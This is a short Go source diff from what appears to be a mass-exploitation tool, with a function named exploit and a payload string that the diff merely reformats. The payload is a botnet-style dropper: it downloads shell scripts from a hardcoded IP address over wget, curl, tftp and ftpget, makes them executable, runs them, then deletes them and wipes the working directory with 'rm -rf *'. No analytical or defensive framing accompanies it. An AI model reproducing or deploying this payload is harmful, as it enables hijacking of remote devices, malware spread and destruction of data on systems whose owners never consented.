@@ -15,8 +15,7 @@ import (
 	"sync"
 )
 
-var payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.191.63.174/ohshit.sh; curl -O http://103.191.63.174/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 103.191.63.174 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 103.191.63.174; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 103.191.63.174 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *
-" //lol
+var payload = "cd /tmp || cd /var/run || cd /mnt || cd /root || cd /; wget http://103.191.63.174/ohshit.sh; curl -O http://103.191.63.174/ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp 103.191.63.174 -c get ohshit.sh; chmod 777 ohshit.sh; sh ohshit.sh; tftp -r ohshit2.sh -g 103.191.63.174; chmod 777 ohshit2.sh; sh ohshit2.sh; ftpget -v -u anonymous -p anonymous -P 21 103.191.63.174 ohshit1.sh ohshit1.sh; sh ohshit1.sh; rm -rf ohshit.sh ohshit.sh ohshit2.sh ohshit1.sh; rm -rf *" //lol
 
 func exploit(target string, wg *sync.WaitGroup) {
 	defer wg.Done()
